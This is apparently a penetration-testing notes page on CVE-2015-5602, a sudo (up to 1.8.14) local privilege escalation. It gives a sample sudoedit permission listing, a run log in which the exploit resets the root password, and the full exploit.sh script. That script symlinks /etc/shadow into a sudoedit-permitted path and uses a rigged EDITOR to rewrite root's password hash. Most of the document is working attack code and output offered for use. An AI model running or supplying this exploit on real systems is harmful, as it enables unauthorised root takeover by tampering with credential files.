---
description: Sudo <=1.8.14 Local Privilege Escalation
---

# Sudo <=1.8.14

[https://github.com/t0kx/privesc-CVE-2015-5602](https://github.com/t0kx/privesc-CVE-2015-5602sh) - exploit.sh

```
[user@test tmp]$ sudo -l
sudo -l
Matching Defaults entries for samantha on cassios:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="QTDIR
    KDEDIR"

User user may run the following commands on cassios:
    (root) NOPASSWD: sudoedit /home/*/*/test.sh
[user@test tmp]$ sudo --version
```

You need to change specified file names to can execute exploit properly.

```
[user@test tmp]$ ./exploit.sh
./exploit.sh
[+] CVE-2015-5602 exploit by t0kx
[+] Creating folder...
[+] Creating symlink
[+] Modify EDITOR...
[+] Change root password to: e7ccbd117813eee6060129d6f8c76ecb
[+] Done
[user@test tmp]$ su root
su root
Password: e7ccbd117813eee6060129d6f8c76ecb

[root@testtmp]#
```

### exploit.sh

```
#!/usr/bin/env bash
# CVE-2015-5602 exploit by t0kx
# https://github.com/t0kx/privesc-CVE-2015-5602

export EDITOR="/tmp/edit"
export FOLDER="${RANDOM}"
export PASSWD=$(printf ${RANDOM} \
		| md5sum \
		| awk '{print $1}')

prepare() {
cat << EOF >> /tmp/edit
#!/usr/bin/env bash
pass="$(printf "%q" $(openssl passwd -1 -salt ${RANDOM} ${PASSWD}))"
sed -i -e  "s,^root:[^:]\+:,root:\${pass}:," \${1}
EOF
}

main() {
	printf "[+] CVE-2015-5602 exploit by t0kx\n"
	printf "[+] Creating folder...\n"
	mkdir -p /home/${USER}/${FOLDER}/
	printf "[+] Creating symlink\n"
	ln -sf /etc/shadow /home/${USER}/${FOLDER}/test.sh
	printf "[+] Modify EDITOR...\n"
	prepare && chmod +x ${EDITOR}
	printf "[+] Change root password to: ${PASSWD}\n"
	sudoedit /home/${USER}/${FOLDER}/test.sh
	printf "[+] Done\n"
}; main
```
